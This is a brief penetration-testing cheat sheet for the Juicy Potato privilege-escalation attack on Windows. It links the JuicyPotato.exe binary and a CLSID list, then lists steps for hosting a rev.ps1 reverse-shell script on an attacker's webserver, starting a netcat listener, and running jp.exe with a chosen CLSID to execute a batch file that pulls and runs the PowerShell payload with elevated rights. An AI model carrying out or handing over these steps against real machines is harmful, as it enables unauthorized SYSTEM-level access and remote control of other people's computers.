# Juicy Potato Attack

## Juicy Potato Attack
 - [OHPE GitHub Juicy-Potato](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
 - [OHPE CLSID by Operating System](https://ohpe.it/juicy-potato/CLSID/)

```
- Setup www webserver on attacking machine (8000)
- Place your rev.ps1 into the www webserver
- Move a copy of setup.bat to your attacking host, or besure the contents have the PowerShell command
- Setup nc listener on 12345 (or whatever port, change rev.ps1 port if different)
- .\jp.exe -t * -p c:\windows\temp\setup.bat -l 1337 -c '{{e60687f7-01a1-40aa-86ac-db1cbf673334}}'
```